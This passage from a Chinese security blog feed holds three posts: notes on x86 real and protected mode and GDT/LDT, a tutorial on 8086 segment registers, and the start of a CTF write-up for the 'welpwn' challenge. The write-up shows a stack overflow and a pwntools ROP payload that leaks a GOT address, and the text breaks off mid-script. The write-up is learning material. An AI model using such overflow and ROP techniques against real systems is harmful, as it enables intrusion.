0xFF1100xFF00*16+0x0110 = 0xFF000+0x0110 = 0xFF110</code></p><h4 id="font-color-brown3应用font"><a class="markdownIt-Anchor" href="#font-color-brown3应用font"></a> <font color="brown"><code>3.应用</code></font></h4><p><font size="2"><strong>在现代计算机上，实模式存在的时间非常短</strong>，所以一般我们是感觉不到它的存在。CPU 复位（reset）或加电（power on）的时候就是以实模式启动，在这个时候处理器以实模式工作，不能实现权限分级，也不能访问 20 位以上的地址线，也就只能访问 1M 内存。之后，加载操作系统模块，进入保护模式。</font></p><p><font size="2">此外，在这种模式下，系统在计算实际地址的时候是按照对 1M 求模的方式进行的，这种技术被称为 wrap-around。也就是说，当程序员给出超过 1M（100000H ~ 10FFEFH）的地址时，为了保持逻辑上正常，系统并不认为其访问越界而产生异常，而是自动从 0 开始计算。</font></p><p><font size="2">然而，在实模式中整个物理内存被看成分段的区域，程序代码和数据位于不同区域，<strong>系统程序和用户程序没有区别对待</strong>，而且每一个指针都是指向「实在」的物理地址。这样一来，用户程序的一个指针如果指向了系统程序区域或其他用户程序区域，并改变了值，容易造成软件甚至系统崩溃。</font></p><h3 id="font-color-navy0x01-保护模式protected-modefont"><a class="markdownIt-Anchor" href="#font-color-navy0x01-保护模式protected-modefont"></a> <font color="navy"><code>0x01 保护模式（Protected Mode）</code></font></h3><h4 id="font-color-brown1起源font-2"><a class="markdownIt-Anchor" href="#font-color-brown1起源font-2"></a> <font color="brown"><code>1.起源</code></font></h4><p><font size="2">最开始的程序寻址是直接的<code>段基址 : 段内偏移</code>模式，这样的好处是所见即所得，程序员指定的地址就是物理地址，物理地址对程序员是可见的。但这就带来一些问题：</font></p><blockquote><ol><li>无法支持多任务</li><li>程序的安全性无法得到保证</li></ol></blockquote><p><font size="2">随着 CPU 的发展，CPU 的地址线的个数也从原来的 20 根变为现在的 32 根，所以可以访问的内存空间也从 1 MB 变为现在 4 GB，寄存器的位数也变为 32 位。因此，实模式下的内存地址计算方式就已经不再适用了，需要引入新的模式，即保护模式，实现更大空间的、更灵活的内存访问。</font></p><p><font size="2">在保护模式下，全部 32 条地址线有效，可寻址高达 4 GB 的物理地址空间。扩充的存储器<code>段式管理机制</code>和可选的<code>页式管理机制</code>，不仅为存储器共享和保护提供了硬件支持，而且为实现<code>虚拟存储器</code>提供了硬件支持，支持多任务，能够快速地进行任务切换和保护任务环境。四个特权级和完善的特权检查机制，既能实现资源共享又能保证代码和数据的安全及任务的隔离。</font></p><p><font size="2">总的来说，保护模式出现的原因名副其实</font>：<strong>保护进程地址空间</strong>。</p><h4 id="font-color-brown2原理font-2"><a class="markdownIt-Anchor" href="#font-color-brown2原理font-2"></a> <font color="brown"><code>2.原理</code></font></h4><p><font size="2">在保护模式下，地址的表示方式与实模式是一样的，都是<code>段基址 : 段内偏移</code>。不过，保护模式下<code>段</code>的概念发生了根本性的改变。实模式下的段值可以看作是地址的一部分，可直接参与转换计算。而保护模式下的段值（尽管仍然由原来的段寄存器表示）变成了一个索引（准确来说是 16 位的段选择子/段标识符 Selector，前 13 位为索引信息，后 3 位是硬件信息），指向了一个数据结构的一个表项（段表项），表项中详细定义了<code>段基址</code>、<code>界限</code>、<code>属性（权限）</code>等内容。这个数据结构是<code>全局描述符</code>（GDT，Global Descriptor Table），也有可能是<code>本地描述符</code>（LDT，Local Descriptor Table）。它们存放关于某个运行在内存中的程序的分段信息的，比如某个程序的代码段是从哪里开始，有多大；数据段又是从哪里开始，有多大。</font></p><p><font size="2">GDT 的作用是用来提供段式存储机制，这种机制是段寄存器和 GDT 中的描述符（段表项）共同支持的。每个描述符在 GDT 中占 8 字节，也就是 2 个双字（一个字等于两个字节，双字等于四个字节），或者说是 64 位。描述符的构成如下图所示：</font></p><p><img src="/images/127-1.png" alt></p><center><font size="1">GDT 描述符示意图（来源见参考）</font></center><p><font size="2">其中：</font></p><ul><li><font size="2">G 位是<code>粒度位</code>（Granularity），用于解释段界限的含义；</font></li><li><font size="2">D/B 位是<code>默认的操作数大小</code>（Default Operation Size），主要是为了能够在 32 位处理器上兼容运行 16 位保护模式的程序；</font></li><li><font size="2">L 位，是<code>64 位代码段标志</code>，保留此位给 64 位处理器使用；</font></li><li><font size="2">AVL 位，是<code>可以使用的位</code>（Available），通常由操作系统来用，处理器并不使用它；</font></li><li><font size="2">P 位是<code>段存在位</code>（Segment Present），表示对应的段是否存在；</font></li><li><font size="2">DPL 表示描述符的<code>特权级</code>（Descriptor Privilege Level），<code>0 ~ 3</code>，0 表示最高特权级别，<strong>这里再次点明了为何叫保护模式</strong>；</font></li><li><font size="2">S 位是<code>描述符的类型位</code>（Descriptor Type），0 为系统段，1 为代码段或数据段；</font></li><li><font size="2">TYPE 字段共 4 位，用于指示描述符的类型（X 执行、W 读写、R 读出、A 已访问）。</font></li></ul><p><font size="2">很明显，描述符中指定了 32 位的<code>段基址</code>，以及 20 位的<code>段界限</code>。在实模式下，段基址并非是真实的物理地址，在计算物理地址时，还要左移 4 位（乘以 16）。和实模式不同，在 32 位保护模式下，段基址是 32 位的，若加上段内偏移即为<code>线性地址</code>。如果未开启分页功能，该线性地址就是<code>物理地址</code>。</font></p><p><img src="/images/127-2.png" alt></p><center><font size="1">GDT 和 LDT 示意图（来源见参考）</font></center><p><font size="2">GDT 和 LDT 的区别在于：</font></p><blockquote><ol><li><font size="2">全局可见（global）和局部可见（local）；</font></li><li><font size="2">LDT 表存放在 LDT 类型的段之中，此时 GDT 必须含有 LDT 的段描述符；</font></li><li><font size="2">LDT 本身是一个段，而 GDT 不是。</font></li></ol></blockquote><p><strong>访问流程</strong>：</p><blockquote><ul><li><font size="2">查找 GDT 在线性地址中的段基址（表本身的位置），需要借助 GDTR 寄存器；</font></li><li><font size="2">通过该段基址和<code>逻辑地址</code>中的段标识符（selector），可以找到 LDT 段描述符；</font></li><li><font size="2">通过 GDT 中的这个 LDT 段描述符可以找到 LDT 相应的基地址；</font></li><li><font size="2">访问 LDT 需要使用 LDT 基地址和 LDT 段选择符（或叫段标识符），为了减少访问 LDT 时的段转换次数，LDT 段基址、LDT 段选择符、LDT 段限长都存放在 LDTR 寄存器中。</font></li></ul></blockquote><p><font size="2"><strong>注意</strong>：这里和 <a href="https://junhaow.com/2018/08/15/%E5%85%B3%E4%BA%8E%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E7%9A%84%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">关于操作系统内存管理的总结</a> 中关于段式内存管理的描述有点出入。这里多了 LDT，因此从 GDT 中获得的是 LDT 段描述符，而不再是段基址。</font></p><p><font size="2">对于操作系统来说，每个系统必须定义一个 GDT，用于系统中的所有任务和程序。系统可选择性定义若干个 LDT。GDT 本身不是一个段，而是线性地址空间的一个数据结构；而 LDT 本身是一个段。</font></p><p><font size="2">想知道更多可以参考第三篇文章，整理得很好。</font></p><h3 id="font-color-navy0x02-referencefont"><a class="markdownIt-Anchor" href="#font-color-navy0x02-referencefont"></a> <font color="navy"><code>0x02 Reference</code></font></h3><ul><li><a href="https://www.cnblogs.com/fatsheep9146/p/5116426.html" target="_blank" rel="noopener">MIT 6.828 JOS 学习笔记 6. Appendix 1: 实模式（real mode）与保护模式（protected mode）</a></li><li><a href="https://www.cnblogs.com/chenwb89/p/operating_system_002.html" target="_blank" rel="noopener">操作系统篇-浅谈实模式与保护模式</a></li><li><a href="https://www.cnblogs.com/chenwb89/p/operating_system_003.html" target="_blank" rel="noopener">操作系统篇-分段机制与 GDT | LDT</a></li><li><a href="http://www.voidcn.com/article/p-cdfddfhd-dr.html" target="_blank" rel="noopener">汇编学习（十七）X86汇编学习 (4) GDT</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;font size=&quot;2&quot;&gt;首先我们要知道这两种模式都是 CPU 的工作模式，实模式是早期 CPU 运行的工作模式，而保护模式则是现代 CPU 运行的工作模式。&lt;/font&gt;&lt;/p&gt;
&lt;h3 id=&quot;font-color-navy0x00-实模式real-modefont
      
    
    </summary>
    
    
      <category term="基础知识" scheme="https://muzibing.github.io/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>实模式下的段寄存器</title>
    <link href="https://muzibing.github.io/2020/06/14/2020.06.14%EF%BC%88126%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/06/14/2020.06.14（126）/</id>
    <published>2020-06-13T16:00:00.000Z</published>
    <updated>2020-06-15T07:24:44.381Z</updated>
    
    <content type="html"><![CDATA[<h3 id="font-color-brown0x00-前言font"><a class="markdownIt-Anchor" href="#font-color-brown0x00-前言font"></a> <font color="brown"><code>0x00 前言</code></font></h3><p>      首先想要说明的是这里介绍的原理都是CPU实模式下的情况，有关CPU工作模式的请<a href="https://zhuanlan.zhihu.com/p/42309472" target="_blank" rel="noopener">点击这里</a>，下面简单的介绍一下段寄存器的来源和故事：</p><blockquote><p>     实模式出现于早期8088CPU时期。当时由于CPU的性能有限，一共只有20位地址线（所以地址空间只有1MB），以及8个16位的通用寄存器，以及4个16位的段寄存器。所以为了能够通过这些16位的寄存器去构成20位的主存地址，必须采取一种特殊的方式。当某个指令想要访问某个内存地址时，它通常需要用下面的这种格式来表示：<code>段基址：段偏移量</code>。<sup>[1]</sup></p><p>     但是随着CPU的发展，CPU的地址线的个数也从原来的20根变为现在的32根，<strong>所以可以访问的内存空间也从1MB变为现在4GB，寄存器的位数也变为32位。所以实模式下的内存地址计算方式就已经不再适合了</strong>。所以就引入了现在的保护模式，实现更大空间的，更灵活的内存访问。</p></blockquote><h3 id="font-color-brown0x01-csipfont"><a class="markdownIt-Anchor" href="#font-color-brown0x01-csipfont"></a> <font color="brown"><code>0x01 CS:IP</code></font></h3><p>      在解释段代码段寄存器CS之前，我们先了解一下16位下8086PC的CPU结构，如下图 ：</p><p><img src="/images/126-1.jpg" alt></p><blockquote><p>从图中可以看出，8086CPU是一个16位结构，它在处理、传输、暂存存储的地址为16位，但是它的地址总线为20位，所以要想办法用“地址加法器”使得两个16位的地址合成一个20位的物理地址。图中已经给出解决方法：用一个16位的段地址和一个16位的偏移地址，使得<code>段地址*16+偏移地址</code>就得到了20位的物理地址，相当于<strong>物理地址=基地址（段地址*16）+偏移地址</strong>，那这里为什么乘上16呢，这是因为这里地址的表示方式是16进制，乘上16相当于左移4位，也就从16位变为20位。</p><p><code>在这里留一个问题：怎么将一个20bit的字符串存储在16bit长的内存中呢？</code></p></blockquote><p>      <font color="green"><strong>在程序运行时，CPU怎么知道下一步要执行的语句呢？</strong></font>这里就需要<code>CS:IP</code>上场了，其中CS是代码段寄存器，<strong>存储的是当前指令的段地址</strong>，IP是指令指针寄存器，<strong>存储的是偏移地址</strong>，在8086PC中，CPU将<code>CS:IP</code>指向的内容当作指令执行，比如在8086PC（16位）中，CS的值为a，IP的值为b，那么 CPU下一条执行的指令就是处于地址<code>a*16+b</code>单元的数据，举例如下图：</p><p><img src="/images/126-2.png" alt></p><blockquote><p>图中的CS值为2000H，IP的值0000H，那么物理地址就为<code>2000H*16+0000H = 20000H</code>，所以要执行的指令为<code>mov ax,0123H</code>，下面我们用DOS的Debug进行调试</p></blockquote><p><img src="/images/126-3.png" alt></p><blockquote><p>首先我们将内存2000:0000-2000:0009处的内存改为如上图中的数据，然后我们再将CS和IP的值进行修改</p></blockquote><p><img src="/images/126-4.png" alt></p><blockquote><p>我们可以从上图中最后一行可以看出，CPU将要执行<code>2000:0000</code>处的指令，这样我们就很清楚代码寄存器CS和指令指针寄存器IP的作用了：<font color="red"><code>被用来指向CPU要执行的指令，也可以说将数据解释为代码</code></font></p></blockquote><h3 id="font-colorbrown-0x02-ds和addressfont"><a class="markdownIt-Anchor" href="#font-colorbrown-0x02-ds和addressfont"></a> <font color="brown"><code>0x02 DS和[address]</code></font></h3><p>      <font color="green"><strong>CPU在读写内存单元的时候，那么它是怎么找到该内存单元地址的？</strong></font>下面就来到了数据段寄存器DS，在8086PC中，<code>内存地址</code>由<code>段地址</code>和<code>偏移地址</code>组成，那么DS就是用来存放要访问数据的段地址的寄存器，比如要读取20001H单元的内容，汇编代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov ax,2000H</span><br><span class="line">mov ds,ax# 不能直接mov ds,2000H，因为8086CPU不支持将数据直接送入段寄存器的操作</span><br><span class="line">mov al,[1]</span><br></pre></td></tr></table></figure><p>      上面的汇编代码就是将地址20001H处的数据读取到寄存器ax的低8位中，其中<code>[1]</code>表示的是内存单元的偏移地址，<strong><code>ds</code>中的数据为内存单元的段地址</strong>，那么物理地址就为：<code>ds*16+1</code>，这里要说明一点：在<code>mov al,[1]</code>指令中，<code>[]</code>中的<code>1</code>是偏移地址，而CPU会默认去寄存器<code>DS</code>中寻找它的段地址。下面我们还是用<code>0x00</code>中的例子来说明这一点：</p><p><img src="/images/126-3.png" alt></p><blockquote><p>地址<code>2000:0000</code>地址的字节为<code>23b8H</code>（<a href="https://zh.wikipedia.org/zh-hans/%E5%AD%97%E8%8A%82%E5%BA%8F" target="_blank" rel="noopener">小端存储</a>），我们将这个值赋给寄存器<code>ax</code>，则汇编指令为：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov ax,2000H</span><br><span class="line">mov ds,ax</span><br><span class="line">mov ax,[0]</span><br></pre></td></tr></table></figure><blockquote><p>我们在<code>Debug</code>中向地址<code>1000:0000</code>处输入我们的指令，然后再修改<code>CS</code>和<code>IP</code>的值分别为<code>1000</code>和<code>0000</code>，如下图：</p></blockquote><p><img src="/images/126-7.png" alt></p><blockquote><p>从上图中最后一行，我们可以看到下一条指令的指令为<code>mov ax,2000H</code>，那么下面我们执行完上面四条指令看一下结果：</p></blockquote><p><img src="/images/126-8.png" alt></p><blockquote><p>这里简单总结一下：<font color="green"><strong>对于存储在内存中的数据，CPU会根据CS:IP或者DS和[address]来解释为代码或者数值</strong></font></p></blockquote><h3 id="font-color-brown0x03-ssspfont"><a class="markdownIt-Anchor" href="#font-color-brown0x03-ssspfont"></a> <font color="brown"><code>0x03 SS:SP</code></font></h3><p>     <font color="green"><strong>CPU如何知道栈顶的位置？</strong></font>有关栈的问题不在这里叙述了，可以参考这两篇文章：<a href="https://zhuanlan.zhihu.com/p/25816426" target="_blank" rel="noopener">手把手教你栈溢出从入门到放弃（上）</a>和<a href="https://zhuanlan.zhihu.com/p/25892385" target="_blank" rel="noopener">手把手教你栈溢出从入门到放弃（下）</a>。我们知道CPU靠的是<code>CS:IP</code>知道了要指令指令所在的位置，靠DS和[address]知道了数据存储的位置，那么CPU也应该有相应的寄存器来存放栈顶的地址，那就是<code>SS:SP</code>，其中段寄存器<code>SS</code>存放的是栈顶的段地址，<code>SP</code>存放的是偏移地址，<strong>任意时刻，SS:SP指向栈顶元素</strong>，push指令和pop指令执行时，CPU会从SS和SP中得到栈顶的位置，但是这里要注意的这两个指令：</p><p><code>push</code></p><blockquote><ul><li><font color="navy">SP = SP - 2，SS:SP指向当前栈顶前面的单元，以当前栈顶前面的单元为新的栈顶</font></li><li><font color="navy">将ax中的值放到SS:SP指向的内存单元，SS:SP此时指向新栈顶</font></li></ul><p>比如初始状态为SS=3000H，SP = 0002H，现在执行<code>push ax</code>，那么栈顶偏移<code>SP = SP - 2</code>，开辟了一个新的16位空间，然后再把ax的值放进去，此时<code>SP=0000H</code>，具体操作如下图</p></blockquote><p><img src="/images/126-9.png" alt></p><blockquote><p>初始值为：</p><ul><li><code>ax=1234H,bx=0000H</code>（普通寄存器）</li><li><code>cs=1000H,IP=000EH</code>（执行指针）</li><li><code>ss=3000H,sp=0002H</code>（栈顶）</li></ul><p>现在向地址<code>1000:000E</code>，处写入下方指令<code>push ax</code>，得到如下结果：</p></blockquote><p><img src="/images/126-10.png" alt></p><blockquote><p>从上图中得出信息：</p><ul><li><code>ax=1234H,bx=0000H</code>（普通寄存器）</li><li><code>cs=1000H,IP=000FH</code>（执行指针）<font size="2" color="navy"><strong>发生改变</strong></font></li><li><code>ss=3000H,sp=0000H</code>（栈顶）<font size="2" color="navy"><strong>发生改变</strong></font></li></ul><p>和我们推到的一样</p></blockquote><p><code>pop</code></p><blockquote><ul><li><font color="navy">将SS:SP指向的内存单元处的数据送入ax中</font></li><li><font color="navy">SP = SP + 2，SS:SP指向当前栈顶下面的单元，以当前栈顶下面的单元为新的栈顶</font></li></ul><p>比如初始状态为SS=3000H，SP=0000H，现在执行<code>pop bx</code>，那么会将此时栈顶的数据（<code>1234H</code>）放入寄存器<code>bx</code>中，然后<code>SP = SP - 2</code>，具体操作如下：</p></blockquote><p><img src="/images/126-10.png" alt></p><blockquote><p>初始值为：</p><ul><li><code>ax=1234H,bx=0000H</code>（普通寄存器）</li><li><code>cs=1000H,IP=000FH</code>（执行指针）</li><li><code>ss=3000H,sp=0000H</code>（栈顶）</li></ul><p>现在向<code>1000:000F</code>中写入<code>pop bx</code>，如下：</p></blockquote><p><img src="/images/126-11.png" alt></p><blockquote><p>从上图中得出信息：</p><ul><li><code>ax=1234H,bx=1234H</code>（普通寄存器）<font size="2" color="navy"><strong>发生改变</strong></font></li><li><code>cs=1000H,IP=0010H</code>（执行指针）<font size="2" color="navy"><strong>发生改变</strong></font></li><li><code>ss=3000H,sp=0002H</code>（栈顶）<font size="2" color="navy"><strong>发生改变</strong></font></li></ul><p>栈顶又恢复到<code>3000:0002</code>，而且bx的值也发生了改变</p></blockquote><h3 id="font-color-navy0x04-referencefont"><a class="markdownIt-Anchor" href="#font-color-navy0x04-referencefont"></a> <font color="navy"><code>0x04 Reference</code></font></h3><p>[1] <a href="http://blog.csdn.net/michael2012zhao/article/details/5554023" target="_blank" rel="noopener">“段寄存器”的故事</a></p><p>[2] 王爽，《汇编语言》</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;font-color-brown0x00-前言font&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-brown0x00-前言font&quot;&gt;&lt;/a&gt; &lt;font color=&quot;brown&quot;&gt;&lt;code&gt;0x00 前言
      
    
    </summary>
    
      <category term="Binary" scheme="https://muzibing.github.io/categories/Binary/"/>
    
    
      <category term="汇编语言" scheme="https://muzibing.github.io/tags/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"/>
    
  </entry>
  
  <entry>
    <title>【XCTF-pwn】welpwn是个什么东西？（RCTF-2015）</title>
    <link href="https://muzibing.github.io/2020/06/12/2020.06.12%EF%BC%88125%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/06/12/2020.06.12（125）/</id>
    <published>2020-06-12T11:36:40.507Z</published>
    <updated>2020-06-12T16:05:28.704Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x00-相关知识点"><a href="#0x00-相关知识点" class="headerlink" title="0x00 相关知识点"></a><font color="navy"><code>0x00 相关知识点</code></font></h3><h4 id="1-x00截断符"><a href="#1-x00截断符" class="headerlink" title="1.\x00截断符"></a><font color="blue"><code>1.\x00截断符</code></font></h4><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;下面给大家一个简单的C程序：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Function：截断符测试</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> a[<span class="number">20</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>,a);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s"</span>,a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我们现在正常运行一下该程序，输入为“Hello\x00World”，运行结果输出为<code>Hello\x00World</code>，有的人可能要有疑问了，这里的输入有<code>\x00</code>，为什么还会输出<code>World</code>？要注意我们这里输入的<code>\x00</code>被当作4个单独的字符<code>\</code>、<code>x</code>、<code>0</code>和<code>0</code>，没有被内存解释为截断符号，所以这里不会发生字符串截断，那么下面我们通过<code>pwntools</code>工具来演示一下符号截断，脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! python3</span></span><br><span class="line"><span class="comment">#! /usr/bin/env python3</span></span><br><span class="line"><span class="comment">#! coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">"./test"</span>)</span><br><span class="line">context(log_level=<span class="string">"debug"</span>)</span><br><span class="line">payload = <span class="string">"1"</span> + str(p64(<span class="number">0</span>),encoding=<span class="string">"unicode_escape"</span>) + <span class="string">"2"</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">print(sh.recv())</span><br></pre></td></tr></table></figure><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;下图是该程序运行的具体过程：</p><p><img src="/images/125-1.png" alt></p><blockquote><ul><li>红色圈中的是p64(0)的数值，会产生<code>\x00</code>截断符</li><li>白色圈中是最后的运行结果，可以发现<code>2</code>没有被打印出来，这是由于前面有截断符号</li></ul></blockquote><p><code>注意</code>：这里应该注意的是对p64()、p32()函数很大概率会产生截断符号</p><h3 id="0x01-题目分析"><a href="#0x01-题目分析" class="headerlink" title="0x01 题目分析"></a><font color="navy"><code>0x01 题目分析</code></font></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># file pwn </span><br><span class="line">pwn: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=a48a707a640bf53d6533992e6d8cd9f6da87f258, not stripped</span><br></pre></td></tr></table></figure><blockquote><p>该程序是一个64位的ELF可执行程序</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># checksec pwn </span><br><span class="line">[*] &apos;/root/Documents/CTF/PWN/XCTF/pwn/2/welpwn/pwn&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><blockquote><p>只开启了栈不可执行保护，下面对IDA中的伪代码进行分析：</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main函数</span></span><br><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [sp+0h] [bp-400h]@1</span></span><br><span class="line"></span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"Welcome to RCTF\n"</span>, <span class="number">0x10</span>uLL);</span><br><span class="line">  fflush(_bss_start);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x400</span>uLL);</span><br><span class="line">  echo((__int64)&amp;buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>main函数功能是输入一个大小为0x400的buf空间，可以看出该输入点不存在栈溢出漏洞；然后里面调用了echo()函数，下面我们进如echo()函数看一下：</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">echo</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s2[<span class="number">16</span>]; <span class="comment">// [sp+10h] [bp-10h]@2</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; *(_BYTE *)(i + a1); ++i )</span><br><span class="line">    s2[i] = *(_BYTE *)(i + a1);</span><br><span class="line">  s2[i] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(<span class="string">"ROIS"</span>, s2) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"RCTF&#123;Welcome&#125;"</span>, s2);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">" is not flag"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">"%s"</span>, s2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>上面的伪代码中for循环的终止条件<code>*(_BYTE *)(i + a1)</code>不是很明白，那么我们就用gdb简单的调试一下，从汇编代码中我们可以看到终止条件所对应的汇编代码为：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x400776 &lt;echo+89&gt;:  test   al,al</span><br><span class="line">0x400778 &lt;echo+91&gt;:  jne    0x400735 &lt;echo+24&gt;</span><br></pre></td></tr></table></figure><blockquote><p>可以通过调试看出，这是在比较寄存器rax中的低16位，如果低16位的ASCII值不为<code>0</code>的，也就是低16位的符号不为<code>\x00</code>的话，则跳转至0x400735，否则结束for循环。那么for的终止条件就很明确了，只要遇见<code>\x00</code>符号就退出循环。然后最后一位赋值给0。</p><p><br>到这里细心的你就会发现<code>s2</code>的空间为<code>ebp-0x10</code>，而<code>a1</code>的大小却足足有<code>0x400</code>，将<code>a1</code>赋值给<code>s2</code>就说明这里存在着栈溢出的漏洞，那么我们可以对<code>buf</code>输入的值的长度超过0x10，那么<code>s2</code>必定会产生栈溢出，下面我们就找一下栈中的情况。</p><ul><li>首先是<code>buf</code>的地址：<code>$rbp-0x400</code>得到<code>0x7fffffffe360</code>，这里的<code>rbp</code>为<code>0x7fffffffe760</code></li><li>再来确定<code>s2</code>的地址：<code>$rbp-0x10</code>得到<code>0x7fffffffe340</code>，这里的<code>rbp</code>为<code>0x7fffffffe350</code></li></ul><p>如下图所示：</p></blockquote><p><img src="/images/125-2.png" alt></p><blockquote><p><code>s2</code>和<code>buf</code>之间的地址差为<code>0x7fffffffe360-0x7fffffffe340=0x20</code>，而栈给<code>echo</code>函数分配的空间就为<code>0x20</code>，那么我们就可以画出一个简单的栈示意图，如下图：</p></blockquote><p><img src="/images/125-3.png" alt></p><blockquote><p>假设我们输入的buf大小正好是<code>0x20</code>，我们来看看栈中的情况，如下图绿色部分就是s2复制的buf的0x20的字节：</p></blockquote><p><img src="/images/125-4.png" alt></p><blockquote><p>那么我们是不是就可以利用这个使得返回地址变为我们想要返回的地方？那么下面我们就尝试一下将返回地址返回到<code>puts</code>函数，然后利用<code>puts</code>函数打印出<code>write</code>函数的<code>GOT</code>中的地址，根据64位的传参情况，我们构造如下payload：</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! python3</span></span><br><span class="line"><span class="comment">#! /usr/bin/env python3</span></span><br><span class="line"><span class="comment">#! conding: utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">"debug"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./pwn"</span>)</span><br><span class="line">sh = process(<span class="string">"./pwn"</span>)</span><br><span class="line">pop_rdi = <span class="number">0x4008a3</span></span><br><span class="line">write_got = elf.got[<span class="string">"write"</span>]</span><br><span class="line">puts_addr = elf.symbols[<span class="string">"puts"</span>]</span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">0x18</span> + str(p64(pop_rdi),encoding=<span class="string">"unicode_escape"</span>) + str(p64(write_got),encoding=<span 